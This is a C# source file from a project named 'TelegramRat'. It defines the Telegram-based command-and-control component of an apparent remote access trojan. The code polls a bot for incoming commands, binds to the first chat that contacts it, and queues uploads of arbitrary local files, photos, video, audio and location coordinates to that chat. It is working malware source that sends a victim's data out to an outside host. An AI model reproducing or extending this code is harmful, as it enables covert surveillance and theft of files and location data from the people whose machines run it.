using System;
using System.IO;
using Telegram.Bot;
using Newtonsoft.Json;
using System.Threading;
using Telegram.Bot.Types;
using System.Threading.Tasks;
using Telegram.Bot.Types.Enums;
using System.Collections.Generic;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Extensions.Polling;

namespace TelegramRat
{
    /// <summary>
    /// Provides sending and receiving messages via Telegram.
    /// </summary>
    internal class NetworkManager : IDisposable
    {
        /// <summary>
        /// Invoked when the bot receives a message.
        /// Receives a username and a message.
        /// </summary>
        public Action<string, string> OnReceived;

        /// <summary>
        /// Invoked when an error occurred.
        /// </summary>
        public Action<Exception> OnError;

        /// <summary>
        /// Should we accept messages from bots?
        /// </summary>
        public bool AcceptBot = false;

        /// <summary>
        /// Are there tasks waiting to be executed.
        /// </summary>
        public bool IsWorkPending { get { return tasks.Count > 0; } }

        /// <summary>
        /// Is there a task currently being executed.
        /// </summary>
        public bool IsWorking { get { return isWorking; } }

        protected TelegramBotClient TelegramBot { get; private set; }
        protected ChatId ChatId { get; private set; } = null;
        protected string LogsPath { get; private set; } = string.Empty;
        
        /// <summary>
        /// Class only accessible by NetworkManager.
        /// Will contain data about every message received, and will be reported in the Report File.
        /// </summary>
        private struct MessageBase
        {
            public long Id;
            public string Username;
            public string Message;
        }
        
        private readonly Queue<Task> tasks = new Queue<Task>();     //Tasks to be run.
        private readonly CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
        private bool isWorking = false;
        private const int WORK_WAIT_TIME = 1000;    //How long should we wait before checking if should run another task.
        
        public NetworkManager(string token)
        {
            TelegramBot = new TelegramBotClient(token);
        }

        public NetworkManager(string token, string logsPath) : this(token)
        {
            LogsPath = logsPath;
        }
        
        public void Start()
        {
            Start(new UpdateType[] { UpdateType.Message, UpdateType.EditedMessage });
        }

        public void Start(UpdateType[] types)
        {
            ReceiverOptions receiverOptions = new ReceiverOptions()
            {
                AllowedUpdates = types
            };

            //Every interval, check if currently executing task, if no, execute the first one in the queue.
            Task.Factory.StartNew(async () =>
            {
                while (!cancellationTokenSource.IsCancellationRequested)
                {
                    //If we are not executing any task, and we have tasks to execute
                    if (!isWorking && IsWorkPending)
                    {
                        //Get and remove the first task and execute it.
                        Task task;
                        lock (tasks)
                            task = tasks.Dequeue();

                        isWorking = true;
                        task.Start();
                        await task;
                    }
                    
                    isWorking = false;
                    Thread.Sleep(WORK_WAIT_TIME);
                }
            });
            TelegramBot.StartReceiving(UpdateHandler, ErrorHandler, receiverOptions);

            LogToFile(LogsPath, "\nBot is Online\n");
        }
        
        public async Task StopAsync()
        {
            await Task.Delay(1000); //Wait for a second to allow the bot to receive the pending messages.      
            cancellationTokenSource.Cancel();
            lock (tasks)
                tasks.Clear();
            
            isWorking = false;
            LogToFile(LogsPath, "\nBot is Offline\n");
        }

        public bool SendMessageAsync(string message)
        {
            if (ChatId == null || string.IsNullOrWhiteSpace(message))
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendTextMessageAsync(ChatId, message);
                    LogToFile(LogsPath, $"Sent to {ChatId} a Message: {message}");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send a message: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendLocationAsync(double latitude, double longitude)
        {
            if (ChatId == null)
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendLocationAsync(ChatId, latitude, longitude);
                    LogToFile(LogsPath, $"Sent to {ChatId} a Location: ({latitude}, {longitude})");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send a Location: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendFileAsync(string filePath)
        {
            if (ChatId == null || string.IsNullOrWhiteSpace(filePath) || !System.IO.File.Exists(filePath))
                return false;

            InputOnlineFile file = PrepareFile(filePath);
            if (file == null)
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendDocumentAsync(ChatId, file, parseMode: ParseMode.Html, caption: $"File Name: {Path.GetFileName(filePath)}");
                    LogToFile(LogsPath, $"Sent to {ChatId} a File");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send a File: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendPhotoAsync(InputOnlineFile file)
        {
            if (file == null)
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendPhotoAsync(ChatId, file, parseMode: ParseMode.Html);
                    LogToFile(LogsPath, $"Sent to {ChatId} a Photo");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send a Photo: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendPhotoAsync(string filePath)
        {
            if (ChatId == null || string.IsNullOrWhiteSpace(filePath) || !(Path.GetExtension(filePath) == ".png" || Path.GetExtension(filePath) == ".jpg") || !System.IO.File.Exists(filePath))
                return false;

            return SendPhotoAsync(PrepareFile(filePath));
        }

        public bool SendVideoAsync(InputOnlineFile file)
        {
            if (file == null)
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendVideoAsync(ChatId, file, parseMode: ParseMode.Html);
                    LogToFile(LogsPath, $"Sent to {ChatId} a Video");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send a Video: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendVideoAsync(string filePath)
        {
            if (ChatId == null || string.IsNullOrWhiteSpace(filePath) || Path.GetExtension(filePath) != ".mp4" || !System.IO.File.Exists(filePath))
                return false;

            return SendVideoAsync(PrepareFile(filePath));
        }

        public bool SendAudioAsync(InputOnlineFile file)
        {
            if (file == null)
                return false;

            QueueTask(new Task(async () =>
            {
                try
                {
                    await TelegramBot.SendAudioAsync(ChatId, file, parseMode: ParseMode.Html);
                    LogToFile(LogsPath, $"Sent to: {ChatId} an Audio");
                }
                catch (Exception e)
                {
                    OnError?.Invoke(e);
                    LogToFile(LogsPath, $"Failed to Send an Audio: {e.Message}");
                }
            }));
            return true;
        }

        public bool SendAudioAsync(string filePath)
        {
            if (ChatId == null || string.IsNullOrWhiteSpace(filePath) || !(Path.GetExtension(filePath) == ".mp3" || Path.GetExtension(filePath) == ".m4a") || !System.IO.File.Exists(filePath))
                return false;
            
            return SendAudioAsync(PrepareFile(filePath));
        }

        public void Dispose()
        {
            cancellationTokenSource?.Dispose();

            GC.SuppressFinalize(this);
            GC.WaitForPendingFinalizers();
        }
        
        /// <summary>
        /// Used to convert path to InputOnlineFile class used to send files via the Telegram API.
        /// </summary>
        /// <param name="path">File to prepare for Telegram API</param>
        /// <returns>file as InputOnlineFile</returns>
        public static InputOnlineFile PrepareFile(string path)
        {
            try
            {
                FileStream stream = System.IO.File.OpenRead(path);
                return new InputOnlineFile(stream);
            }
            catch (Exception) { return null; }
        }

        private void QueueTask(Task task)
        {
            lock (tasks)
                tasks.Enqueue(task);
        }

        private async Task UpdateHandler(ITelegramBotClient bot, Update update, CancellationToken token)
        {
            if (update.Message == null)
                return;
            if (update.Message.From != null && update.Message.From.IsBot && !AcceptBot)
            {
                LogToFile(LogsPath, $"Received a message from a bot, but the client is not accepting bots: {update.Message.Text}");
                return;
            }

            //Set the ChatId for the first time.
            if (ChatId == null)
                ChatId = update.Message.Chat.Id;

            if (update.Message.Type == MessageType.Text)
            {
                string username = $"{update.Message.From.FirstName} {update.Message.From.LastName}" ?? "Empty";
                string message = update.Message.Text ?? "Empty";

                MessageBase botUpdate = new MessageBase()
                {
                    Id = update.Message.Chat.Id,
                    Username = username,
                    Message = message
                };

                LogToFile(LogsPath, JsonConvert.SerializeObject(botUpdate));
                OnReceived?.Invoke(username, message);
            }
        }

        private async Task ErrorHandler(ITelegramBotClient bot, Exception exception, CancellationToken token)
        {
            OnError?.Invoke(exception);
            LogToFile(LogsPath, $"Encountered an error: {exception.Message}");
        }

        private static void LogToFile(string path, string data)
        {
            if (string.IsNullOrWhiteSpace(path) || string.IsNullOrWhiteSpace(data))
                return;

            try
            {
                using (FileStream fs = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                        sw.WriteLine($"[{DateTime.Now}] {data}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Failed to write to: {path}, {e.Message}");
            }
        }
    }
}